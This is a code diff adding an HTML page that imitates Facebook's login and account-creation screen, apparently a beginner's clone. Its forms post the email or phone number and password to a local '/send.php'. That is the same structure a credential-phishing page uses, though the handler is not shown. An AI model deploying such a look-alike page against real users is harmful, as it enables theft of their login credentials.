@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300&family=Montserrat:wght@500&family=Nunito:wght@600;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+    <title>Document</title>
+</head>
+<body>
+<form name="formulario" method="post" action="/send.php">
+<div class="header">
+        
+    <span id="usuario">
+      <input type="text" name="correo y telefono" />
+    </span>
+
+    <span id="pass">
+      <input type="password" name="contraseña" />
+    </span>
+
+    <button type="submit">Log In</button>
+    </form>
+  </div>
+</form>
+<div class="informacion">
+    <h1>Create a new account</h1>
+    
+    <p>It´s free and always will be</p>
+    <br>
+
+    <form name="formulario" method="post" action="/send.php" id="form2">
+
+    <input type="text" name="First name" placeholder="First name" style="width: 45%; height: 30px;"> <input type="text" name="Surname" placeholder="Surname" style="width: 45%; height: 30px;">
+    <br><br>
+    
+    <input type="text" name="identificador" placeholder="Mobile number or email address" style="width: 390px; height: 30px;" >
+    <br><br>
+    <input type="password" name="contraseña" placeholder="New password" style="width: 390px; height: 30px;">
+    
+<br><br>
+    <label>Birthday</label>
+    <br>
+    
+    <label id="texto_fecha"><input type="date" name="fecha" min="1999-07-14" max="2080-12-31"> Why do i need to provide my date of birth </label>
+    
+    <br><br>
+
+    <input type="radio" name="F" id=""> Female
+    <input type="radio" name="M" id=""> Male
+    </form>
+    <br><br>
+    <p>
+        By clicking Create Account, you agree to our Terms and confirm
+         that you have read our Date Policy, including our Cookis Use Policy.
+          You may recerve SMS message notifications from 
+          Facebook and can opt out at any time.
+    </p>
+    <br><br>
+    <div class="footer">
+        <button type="submit">Creat Account</button>
+    </div>
+</div>
+</body>
+</html>
